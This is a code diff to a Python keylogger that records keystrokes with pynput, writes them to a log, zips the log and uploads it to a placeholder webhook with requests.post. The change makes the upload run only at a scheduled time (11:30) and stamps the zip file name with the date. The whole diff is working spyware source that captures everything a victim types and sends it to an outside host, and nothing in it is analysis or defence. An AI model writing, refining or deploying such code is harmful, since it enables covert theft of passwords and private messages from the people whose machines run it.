@@ -2,8 +2,13 @@ from pynput.keyboard import Key, Listener
 import requests
 import zipfile
 from os import path
+import datetime
 
 webhook = "WEBHOOK HERE"
+
+
+scheduled_hour = 11
+scheduled_minute = 30
 
 
 count = 0
@@ -23,7 +28,9 @@ def on_press(key):
         count = 0
         write_file(keys)
         keys = []
-        zipandshare()
+        now = datetime.datetime.now()
+        if now.hour == scheduled_hour and now.minute == scheduled_minute:
+            zipandshare()
 
 
 def write_file(keys):
@@ -40,12 +47,17 @@ def write_file(keys):
 
 
 def zipandshare():
-    with zipfile.ZipFile(zip_path, "w") as zip:
-        zip.write(log_path,path.basename(log_path))
+    now = datetime.datetime.now()
+    formatted_date = now.strftime("%d.%m.%Y")
+    zip_filename = f"logs_{formatted_date}.zip"
+    zip_full_path = path.join(file_path, zip_filename)
+    
+    with zipfile.ZipFile(zip_full_path, "w") as zip:
+        zip.write(log_path, path.basename(log_path))
 
-    with open(zip_path, "rb") as zip_file:
+    with open(zip_full_path, "rb") as zip_file:
         payload_data = {
-            "file": ("logs.zip", zip_file)
+            "file": (zip_filename, zip_file)
         }
         response = requests.post(webhook, files=payload_data)
 
